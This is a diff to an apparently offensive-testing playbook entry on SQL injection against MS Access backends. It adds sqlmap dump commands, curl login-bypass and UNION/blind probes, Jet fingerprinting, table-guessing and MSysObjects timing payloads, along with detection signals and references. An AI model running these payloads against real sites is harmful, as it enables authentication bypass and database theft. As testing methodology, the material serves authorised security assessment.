@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-02: "MS Access Injection grants INSERT/UPDATE access to write an unsanitized script payload directly into a stored field, achieving persistent Stored XSS against every user who views the record = Critical (Mass Account Compromise)"
 ---
 
 # wstg-inpv-05.5
@@ -204,6 +205,84 @@ admin'--
 
 ---
 
+## Tools
+
+| Tool | Description | Usage |
+| --- | --- | --- |
+| **sqlmap** | Automated SQLi (supports MS Access via `--dbms=access`) | `sqlmap -u "https://{target}/page?id=1" --dbms=access --dump` |
+| **Burp Suite** | Manual request tampering/Intruder | Repeater + Intruder with payload list |
+| **curl** | Manual boolean/error-based probing | See below |
+
+---
+
+## Example Commands/Payloads
+
+### Detection (curl)
+
+```bash
+TARGET="https://target.com/product.asp"
+
+# MS Access-specific error trigger (classic ASP/ADO)
+curl -s "$TARGET?id=1'" | grep -Ei "Microsoft JET Database Engine|Microsoft OLE DB Provider for ODBC Drivers|ODBC Microsoft Access Driver"
+
+# Auth bypass on login form
+curl -s -X POST "https://target.com/login.asp" -d "user=admin'--&pass=x"
+curl -s -X POST "https://target.com/login.asp" -d "user=' OR '1'='1&pass=' OR '1'='1"
+
+# UNION column-count discovery (Access requires exact type/column match, no information_schema)
+for n in 1 2 3 4 5; do
+  cols=$(python3 -c "print(','.join(['NULL']*$n))")
+  curl -s "$TARGET?id=1 UNION SELECT $cols FROM users--"
+done
+
+# Blind boolean via IIF (Access has no native SLEEP/WAITFOR - time-based needs heavy subqueries)
+curl -s "$TARGET?id=1 AND IIF((SELECT TOP 1 username FROM users)='admin',1,0)=1--"
+```
+
+### DBMS Fingerprint (keyword-based, distinguishes Access from other backends)
+
+```sql
+val(cvar(1))=1
+IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0
+```
+
+These evaluate `TRUE`/produce a distinctive error only under Jet/ACE — useful to positively confirm Access when generic error text is suppressed.
+
+### Table/Column Name Guessing (no information_schema in Access)
+
+Access has no `information_schema`, so table and column names must be brute-forced via existence checks rather than enumerated directly:
+
+```sql
+-- Confirm a guessed table name exists (error-free response = exists)
+' AND (SELECT COUNT(*) FROM users)>=0--
+' AND (SELECT COUNT(*) FROM tbl_users)>=0--
+' AND (SELECT COUNT(*) FROM admin)>=0--
+
+-- Confirm a guessed column name exists in a known table
+' AND (SELECT COUNT(password) FROM users)>=0--
+```
+
+### Heavy-Query Time-Based Approximation (Access has no SLEEP/WAITFOR)
+
+```sql
+' AND (SELECT COUNT(*) FROM MSysObjects AS T1, MSysObjects AS T2, MSysObjects AS T3)>0--
+```
+
+A large self-cross-join against system tables introduces a measurable delay, acting as a crude timing oracle when boolean-based blind is unavailable (e.g. no content-length difference).
+
+### Detection Pattern
+
+| Signal | Meaning |
+| ------ | ------- |
+| `Microsoft JET Database Engine` / `Microsoft OLE DB Provider for ODBC Drivers` / `ODBC Microsoft Access Driver` in response | Error-based SQLi, confirms MS Access (Jet/ACE engine) backend |
+| `UNION SELECT` succeeds only when column count and rough data types match exactly | Access's strict UNION typing confirms DBMS and injectable column count |
+| No response delay from `SLEEP()`/`WAITFOR` payloads but boolean `IIF()` comparisons change output | Access lacks time-based primitives — rely on boolean-based blind only |
+| `MSysObjects` query returns table names | System catalog access confirms Jet engine internals reachable |
+| `val(cvar(1))=1` evaluates true where equivalent generic payloads fail | Jet/ACE-specific function confirms Access over MySQL/MSSQL/PostgreSQL |
+| Response measurably slower only for a self-cross-joined `MSysObjects` subquery | Confirms injection point via query cost, substituting for the missing `SLEEP()`/`WAITFOR` primitives |
+
+---
+
 ## Remediation
 
 ```vb
@@ -233,6 +312,12 @@ Set rs = cmd.Execute()
 | ---------- | ------------- |
 | **CWE-89** | SQL Injection |
 
+---
+
+## References
+
+- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
+- [PayloadsAllTheThings - SQL Injection (MS Access)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#microsoft-access)
 
 ---
 
